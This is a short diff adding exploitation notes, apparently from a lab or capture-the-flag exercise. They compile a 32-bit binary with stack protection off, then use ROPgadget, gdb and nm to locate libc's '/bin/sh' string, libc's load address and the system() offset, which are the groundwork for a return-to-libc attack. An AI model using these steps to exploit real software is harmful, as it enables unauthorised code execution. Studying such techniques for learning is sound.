@@ -1,0 +1,10 @@
+g++ -m32 -fno-stack-protector -g bypass.cpp -o bypass
+
+ROPgadget --binary /lib/i386-linux-gnu/libc.so.6 --string "/bin/sh"
+0x00160a24 : /bin/sh
+
+gdb -q bypass -ex "set confirm off" -ex "set disable-randomization off" -ex "b main" -ex "r" -ex "info proc mappings" -ex "q"
+libc: 0xf75..000
+
+nm -D /lib/i386-linux-gnu/libc.so.6 | grep system
+system: 00040190
